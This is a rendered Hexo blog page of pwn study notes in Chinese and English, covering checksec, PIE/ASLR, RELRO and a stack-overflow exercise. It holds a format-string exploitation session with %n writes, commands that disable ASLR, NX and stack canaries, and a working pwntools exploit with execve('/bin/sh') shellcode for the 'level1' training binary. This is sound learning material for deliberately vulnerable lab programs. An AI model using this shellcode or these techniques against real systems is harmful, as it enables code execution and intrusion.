@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>一些笔记 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Two parameters in checksec Some usages in gcc   PIE combined with ASLR  #include &lt;stdio.h&gt;  void func();  int uninitialGlobalVar; int globalVar &#x3D; 1;  int main(void) {     int localVar &#x3D; 1;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一些笔记">
+<meta property="og:url" content="http://example.com/2019/08/08/2019-08-08-some_note/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Two parameters in checksec Some usages in gcc   PIE combined with ASLR  #include &lt;stdio.h&gt;  void func();  int uninitialGlobalVar; int globalVar &#x3D; 1;  int main(void) {     int localVar &#x3D; 1;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-08-07T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-08-07T18:15:52.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-2019-08-08-some_note" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/08/08/2019-08-08-some_note/" class="article-date">
+  <time class="dt-published" datetime="2019-08-07T16:00:00.000Z" itemprop="datePublished">2019-08-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      一些笔记
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Two-parameters-in-checksec"><a href="#Two-parameters-in-checksec" class="headerlink" title="Two parameters in checksec"></a>Two parameters in <code>checksec</code></h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://jin-yang.github.io/post/program-c-gcc-security-options.html">Some usages in gcc </a></p>
+</blockquote>
+<h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><blockquote>
+<p>combined with ASLR</p>
+</blockquote>
+<pre><code>#include &lt;stdio.h&gt;
+
+void func();
+
+int uninitialGlobalVar;
+int globalVar = 1;
+
+int main(void)
+{
+    int localVar = 1;
+
+    printf(&quot;Address of func() is %p, in text setment\n&quot;, func);
+    printf(&quot;Address of uninitialGlobalVar is %p, in bss segment\n&quot;, &amp;uninitialGlobalVar);
+    printf(&quot;Address of globalVar is %p, in data segment\n&quot;, &amp;globalVar);
+    printf(&quot;Address of localVar is %p, in stack\n&quot;, &amp;localVar);
+
+    return 0;
+}
+
+void func()
+{
+    ;
+}
+</code></pre>
+<p>You can find differences between <code>aslr</code> and <code>pie</code> from this <a target="_blank" rel="noopener" href="https://blog.csdn.net/Plus_RE/article/details/79199772">dalao’s blog </a>. We can use <code>-no-pie</code> this parameter to choose whether open pie or not in gcc . To put it simply , PIE only decide bss&#x2F;data&#x2F;code ‘s randomization .</p>
+<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><blockquote>
+<p>combined with format string vulnerability</p>
+</blockquote>
+<p>I write a demo like this :</p>
+<pre><code>#include &lt;stdio.h&gt;
+void show()
+{
+	system(&quot;/bin/sh&quot;);
+}
+int main() {
+	char a[100];
+	scanf(&quot;%s&quot;,a);
+	printf(a);
+	return(0);
+}
+//gcc -g -no-pie  -z norelro -m32 te.c
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; p.sendline(&#x27;%p.%p.%p.%p.%p.%p&#x27;)//test the offset</span><br><span class="line">&gt;&gt;&gt; p.recv()</span><br><span class="line">[*] Process &#x27;./a.out&#x27; stopped with exit code 0 (pid 431)</span><br><span class="line">&#x27;0xffa5a078.0xf7f36410.0x8048548.(nil).0x1.0x252e7025&#x27;</span><br><span class="line">//the offset is 6</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; p.sendline(&#x27;\x01\x80\x04\x08%x.%x.%x.%x.%x.%s&#x27;)</span><br><span class="line">&gt;&gt;&gt; p.recv()</span><br><span class="line">[*] Process &#x27;./a.out&#x27; stopped with exit code 0 (pid 433)</span><br><span class="line">&#x27;\x01\x80\x04\x08ffd1d438.f7f8c410.8048548.0.1.ELF\x01\x01\x01&#x27;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; p.sendline(&#x27;\x01\x80\x04\x08%6$s&#x27;)</span><br><span class="line">&gt;&gt;&gt; p.recv()</span><br><span class="line">[*] Process &#x27;./a.out&#x27; stopped with exit code 0 (pid 434)</span><br><span class="line">&#x27;\x01\x80\x04\x08ELF\x01\x01\x01&#x27;</span><br></pre></td></tr></table></figure>
+<pre><code>//use %n to change the old bss value
+bss_addr=0x0804a028//readelf -S a.out
+bss = &#39;\x28\xa0\x04\x08%6$n&#39;//change to 4
+bss = &#39;\x28\xa0\x04\x08%96c%6$n&#39;//change to 100
+</code></pre>
+<p>there is a code for format string vulnerability in pwntools : <code>payload = fmtstr_payload(6, {printf_got:system_plt})</code> . We can use <code>objdump -R $file_name</code> to find the specific function_got . However if you open RELRO , you will not be able to modify <code>printf_got</code> .</p>
+<p>今天从零开始学<strong>stack</strong>,也算是记录一下吧,在这里记录一下特别细的知识点</p>
+<h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><p>使用<code>gcc -g -fno-stack-protector -z execstack -o test test.c</code>依次关掉<strong>Canary</strong>和<strong>NX</strong></p>
+<p><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭<strong>ASLR</strong></p>
+<p><code> ulimit -c unlimited</code>表示自己程序只要错误就生成dump文件,之后<code>echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern</code>表示存到tmp目录下,之后我们就可以<code>gdb $文件名 core.%t</code>调试了</p>
+<h2 id="ASLR和PIE的各种事"><a href="#ASLR和PIE的各种事" class="headerlink" title="ASLR和PIE的各种事"></a>ASLR和PIE的各种事</h2><p>其实我第一遍学的时候以为,emm,这不是一样的东西吗,甚至以为效果是它俩求并就行,靠发现完全不是,<a target="_blank" rel="noopener" href="https://blog.csdn.net/Plus_RE/article/details/79199772">这个</a>写的很棒了,谢谢师傅,在这里简单记录一下技巧吧(表格中提到的是被随机化的,堆另外再提)</p>
+<table>
+<thead>
+<tr>
+<th align="center">\</th>
+<th align="center">aslr&#x3D;0</th>
+<th align="center">aslr&#x3D;1</th>
+<th align="center">aslr&#x3D;2</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">开启PIE</td>
+<td align="center">null</td>
+<td align="center">code\data\stack</td>
+<td align="center">libc\code\data\stack</td>
+</tr>
+<tr>
+<td align="center">关闭PIE</td>
+<td align="center">null</td>
+<td align="center">stack</td>
+<td align="center">libc\stack</td>
+</tr>
+</tbody></table>
+<p><strong>brk()</strong> 在aslr为1时地址静止,<strong>mmap()</strong> 地址随机</p>
+<p>如果你想,emm,那我直接关闭本地aslr不完事了吗,hah,年轻了亚还是,远程服务器可是开着的,掩耳盗铃还行,所以一般情况下我们只能找漏洞点让数据泄漏出来</p>
+<h2 id="所有保护全关-跳转执行shellcode"><a href="#所有保护全关-跳转执行shellcode" class="headerlink" title="所有保护全关-&gt;跳转执行shellcode"></a>所有保护全关-&gt;跳转执行shellcode</h2><p>在栈上写shellcode后ret直接指向shellcode就行,最简单的一种利用,但是我们要注意到底要覆盖多少字节,同时我们应该注意这种类型的漏洞关键便是理解好堆栈,我们以下方程序举例,一起分析一下堆栈</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void hello(int x) &#123;</span><br><span class="line">    printf(&quot;hello %d\n&quot;,x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">    hello(3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后直接<code>gcc -m32 test</code>进行编译运行,之后直接到gdb中进行调试<br>首先<code>b main</code>断到main函数,之后一步一步看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  0x8048435 &lt;main+14&gt;    sub    esp, 4</span><br><span class="line">  0x8048438 &lt;main+17&gt;    sub    esp, 0xc</span><br><span class="line">► 0x804843b &lt;main+20&gt;    push   3</span><br><span class="line">  0x804843d &lt;main+22&gt;    call   hello &lt;0x804840b&gt;</span><br></pre></td></tr></table></figure>
+<p>这是hello函数前的准备,我们只需要注意<code>push 3</code>这步操作,执行完后esp-4,同时指向3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">   0x8048435 &lt;main+14&gt;    sub    esp, 4</span><br><span class="line">   0x8048438 &lt;main+17&gt;    sub    esp, 0xc</span><br><span class="line">   0x804843b &lt;main+20&gt;    push   3</span><br><span class="line"> ► 0x804843d &lt;main+22&gt;    call   hello &lt;0x804840b&gt;</span><br><span class="line">        arg[0]: 0x3</span><br><span class="line">        arg[1]: 0xffffd0b4 —▸ 0xffffd293 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br><span class="line">        arg[2]: 0xffffd0bc —▸ 0xffffd2af ◂— &#x27;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0&#x27;</span><br><span class="line">        arg[3]: 0x8048481 (__libc_csu_init+33) ◂— lea    eax, [ebx - 0xf8]</span><br><span class="line"> </span><br><span class="line">   0x8048442 &lt;main+27&gt;    add    esp, 0x10</span><br><span class="line">   0x8048445 &lt;main+30&gt;    mov    eax, 0</span><br><span class="line">   0x804844a &lt;main+35&gt;    mov    ecx, dword ptr [ebp - 4]</span><br><span class="line">   0x804844d &lt;main+38&gt;    leave  </span><br><span class="line">   0x804844e &lt;main+39&gt;    lea    esp, [ecx - 4]</span><br><span class="line">   0x8048451 &lt;main+42&gt;    ret    </span><br><span class="line"> </span><br><span class="line">   0x8048452              nop    </span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffcff0 ◂— 0x3</span><br><span class="line">01:0004│      0xffffcff4 —▸ 0xffffd0b4 —▸ 0xffffd293 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br><span class="line">02:0008│      0xffffcff8 —▸ 0xffffd0bc —▸ 0xffffd2af ◂— &#x27;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0&#x27;</span><br><span class="line">03:000c│      0xffffcffc —▸ 0x8048481 (__libc_csu_init+33) ◂— lea    eax, [ebx - 0xf8]</span><br><span class="line">04:0010│      0xffffd000 —▸ 0xf7fb03dc (__exit_funcs) —▸ 0xf7fb11e0 (initial) ◂— 0x0</span><br><span class="line">05:0014│      0xffffd004 —▸ 0xffffd020 ◂— 0x1</span><br><span class="line">06:0018│ ebp  0xffffd008 ◂— 0x0</span><br><span class="line">07:001c│      0xffffd00c —▸ 0xf7e16637 (__libc_start_main+247) ◂— add    esp, 0x10</span><br></pre></td></tr></table></figure>
+<p>之后call指令,我们把下一个地址即<code>0x8048442</code>入栈,我们<code>s</code>跟进,函数开始了经典的提升栈操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► 0x804840b &lt;hello&gt;       push   ebp</span><br><span class="line">   0x804840c &lt;hello+1&gt;     mov    ebp, esp</span><br><span class="line">   0x804840e &lt;hello+3&gt;     sub    esp, 8</span><br><span class="line">   0x8048411 &lt;hello+6&gt;     sub    esp, 8</span><br><span class="line">   0x8048414 &lt;hello+9&gt;     push   dword ptr [ebp + 8]</span><br><span class="line">   0x8048417 &lt;hello+12&gt;    push   0x80484e0</span><br><span class="line">   0x804841c &lt;hello+17&gt;    call   printf@plt &lt;0x80482e0&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048421 &lt;hello+22&gt;    add    esp, 0x10</span><br><span class="line">   0x8048424 &lt;hello+25&gt;    nop    </span><br><span class="line">   0x8048425 &lt;hello+26&gt;    leave  </span><br><span class="line">   0x8048426 &lt;hello+27&gt;    ret    </span><br></pre></td></tr></table></figure>
+<p>看到执行到<code>hello+6</code>的操作应该是栈被抬高了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 8</span><br><span class="line">00:0000│ esp  0xffffcfd8 ◂— 0x0</span><br><span class="line">01:0004│      0xffffcfdc —▸ 0xf7e1632a (init_cacheinfo+666) ◂— mov    dword ptr [esp + 0xc], 2</span><br><span class="line">02:0008│      0xffffcfe0 ◂— 0x1</span><br><span class="line">... ↓</span><br><span class="line">04:0010│ ebp  0xffffcfe8 —▸ 0xffffd008 ◂— 0x0</span><br><span class="line">05:0014│      0xffffcfec —▸ 0x8048442 (main+27) ◂— add    esp, 0x10</span><br><span class="line">06:0018│      0xffffcff0 ◂— 0x3</span><br><span class="line">07:001c│      0xffffcff4 —▸ 0xffffd0b4 —▸ 0xffffd293 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br></pre></td></tr></table></figure>
+<p>之后的<code> ► 0x8048414 &lt;hello+9&gt;     push   dword ptr [ebp + 8]</code>我们应该知道了,这个是参数,目前具体的堆栈图如下</p>
+<table>
+<thead>
+<tr>
+<th align="center">指针</th>
+<th align="center">内存</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">esp</td>
+<td align="center">sth</td>
+</tr>
+<tr>
+<td align="center">esp+4</td>
+<td align="center">sth</td>
+</tr>
+<tr>
+<td align="center">esp+8</td>
+<td align="center">sth</td>
+</tr>
+<tr>
+<td align="center">esp+c</td>
+<td align="center">sth</td>
+</tr>
+<tr>
+<td align="center">ebp</td>
+<td align="center">$ebp</td>
+</tr>
+<tr>
+<td align="center">ebp+4</td>
+<td align="center">ret</td>
+</tr>
+<tr>
+<td align="center">ebp+8</td>
+<td align="center">3</td>
+</tr>
+</tbody></table>
+<p>之后的调用我们就不谈了,继续到<code>leave</code>指令,所谓这个指令就是和抬升栈相反,我们只需要记住这是反操作就行了,执行完后指针下移,ret返回主函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">   0x8048417 &lt;hello+12&gt;    push   0x80484e0</span><br><span class="line">   0x804841c &lt;hello+17&gt;    call   printf@plt &lt;0x80482e0&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048421 &lt;hello+22&gt;    add    esp, 0x10</span><br><span class="line">   0x8048424 &lt;hello+25&gt;    nop    </span><br><span class="line">   0x8048425 &lt;hello+26&gt;    leave  </span><br><span class="line"> ► 0x8048426 &lt;hello+27&gt;    ret             &lt;0x8048442; main+27&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x8048442 &lt;main+27&gt;     add    esp, 0x10</span><br><span class="line">   0x8048445 &lt;main+30&gt;     mov    eax, 0</span><br><span class="line">   0x804844a &lt;main+35&gt;     mov    ecx, dword ptr [ebp - 4]</span><br><span class="line">   0x804844d &lt;main+38&gt;     leave  </span><br><span class="line">   0x804844e &lt;main+39&gt;     lea    esp, [ecx - 4]</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffcfec —▸ 0x8048442 (main+27) ◂— add    esp, 0x10</span><br><span class="line">01:0004│      0xffffcff0 ◂— 0x3</span><br><span class="line">02:0008│      0xffffcff4 —▸ 0xffffd0b4 —▸ 0xffffd293 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br><span class="line">03:000c│      0xffffcff8 —▸ 0xffffd0bc —▸ 0xffffd2af ◂— &#x27;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0&#x27;</span><br><span class="line">04:0010│      0xffffcffc —▸ 0x8048481 (__libc_csu_init+33) ◂— lea    eax, [ebx - 0xf8]</span><br><span class="line">05:0014│      0xffffd000 —▸ 0xf7fb03dc (__exit_funcs) —▸ 0xf7fb11e0 (initial) ◂— 0x0</span><br><span class="line">06:0018│      0xffffd004 —▸ 0xffffd020 ◂— 0x1</span><br><span class="line">07:001c│ ebp  0xffffd008 ◂— 0x0</span><br></pre></td></tr></table></figure>
+<p>顺利结束</p>
+<h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><p>我们简单使用<strong>一步一步学ROP之linux_x86篇</strong>的level1简单练习一下exp只需要改一下ret就行,我们找一下使用cyclic生成字符串后贴到里边,找到$esp-144,得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> EAX  0xc9</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffcfb0 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> EDX  0x100</span><br><span class="line"> EDI  0xf7fb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> ESI  0xf7fb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> EBP  0x6261616a (&#x27;jaab&#x27;)</span><br><span class="line"> ESP  0xffffd040 ◂— &#x27;laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="line"> EIP  0x6261616b (&#x27;kaab&#x27;)</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">Invalid address 0x6261616b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd040 ◂— &#x27;laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="line">01:0004│      0xffffd044 ◂— &#x27;maabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="line">02:0008│      0xffffd048 ◂— &#x27;naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="line">03:000c│      0xffffd04c ◂— &#x27;oaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="line">04:0010│      0xffffd050 ◂— &#x27;paabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="line">05:0014│      0xffffd054 ◂— &#x27;qaabraabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="line">06:0018│      0xffffd058 ◂— &#x27;raabsaabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br><span class="line">07:001c│      0xffffd05c ◂— &#x27;saabtaabuaabvaabwaabxaabyaab\n&#x27;</span><br></pre></td></tr></table></figure>
+<p>可见是<code>0xffffd040-144</code>,所以直接填到里边,exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./level1&#x27;)</span><br><span class="line"></span><br><span class="line">ret = 0xffffd040-144</span><br><span class="line"></span><br><span class="line"># execve (&quot;/bin/sh&quot;) </span><br><span class="line"># xor ecx, ecx</span><br><span class="line"># mul ecx</span><br><span class="line"># push ecx</span><br><span class="line"># push 0x68732f2f   ;; hs//</span><br><span class="line"># push 0x6e69622f   ;; nib/</span><br><span class="line"># mov ebx, esp</span><br><span class="line"># mov al, 11</span><br><span class="line"># int 0x80</span><br><span class="line"></span><br><span class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span><br><span class="line">shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span><br><span class="line">shellcode += &quot;\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">payload =  shellcode + &#x27;A&#x27; * (140 - len(shellcode))   + p32(ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>但是在实际运行时发生错误,发现竟然相差0x10个字节,ret是<code>0xffffd050-144</code>,我并不知道为什么</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd050 —▸ 0xf7fb03dc (__exit_funcs) —▸ 0xf7fb11e0 (initial) ◂— 0x0</span><br><span class="line">01:0004│      0xffffd054 —▸ 0x80481fc ◂— add    byte ptr cs:[eax], al /* &#x27;.&#x27; */</span><br><span class="line">02:0008│      0xffffd058 —▸ 0x8048469 (__libc_csu_init+9) ◂— add    ebx, 0x1b8b</span><br><span class="line">03:000c│      0xffffd05c ◂— 0x0</span><br><span class="line">04:0010│      0xffffd060 —▸ 0xf7fb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line">... ↓</span><br><span class="line">06:0018│      0xffffd068 ◂— 0x0</span><br><span class="line">07:001c│      0xffffd06c —▸ 0xf7e16637 (__libc_start_main+247) ◂— add    esp, 0x10</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0 ffffcfb0</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/32gx $esp-144</span><br><span class="line">0xffffcfc0:	0x2f2f6851e1f7c931	0x896e69622f686873</span><br><span class="line">0xffffcfd0:	0x41414180cd0bb0e3	0x4141414141414141</span><br><span class="line">0xffffcfe0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0xffffcff0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0xffffd000:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0xffffd010:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0xffffd020:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0xffffd030:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0xffffd040:	0x4141414141414141	0xffffcfb041414141</span><br><span class="line">0xffffd050:	0x080481fcf7fb03dc	0x0000000008048469</span><br><span class="line">0xffffd060:	0xf7fb0000f7fb0000	0xf7e1663700000000</span><br><span class="line">0xffffd070:	0xffffd10400000001	0x00000000ffffd10c</span><br><span class="line">0xffffd080:	0x0000000000000000	0xf7ffdc04f7fb0000</span><br><span class="line">0xffffd090:	0x00000000f7ffd000	0xf7fb0000f7fb0000</span><br><span class="line">0xffffd0a0:	0x762412ab00000000	0x000000004b4f1cbb</span><br><span class="line">0xffffd0b0:	0x0000000000000000	0x0804835000000001</span><br><span class="line">pwndbg&gt; p $esp</span><br><span class="line">$1 = (void *) 0xffffd050</span><br></pre></td></tr></table></figure>
+<p>今天努力分析一下原因吧,虽然也能调出来,但是这佛系bug让我属实难以接受,不知道和本机环境有没有关系</p>
+<h2 id="简单的解释"><a href="#简单的解释" class="headerlink" title="简单的解释"></a>简单的解释</h2><p>简单看一下这个bug,我自己写了一个小demo</p>
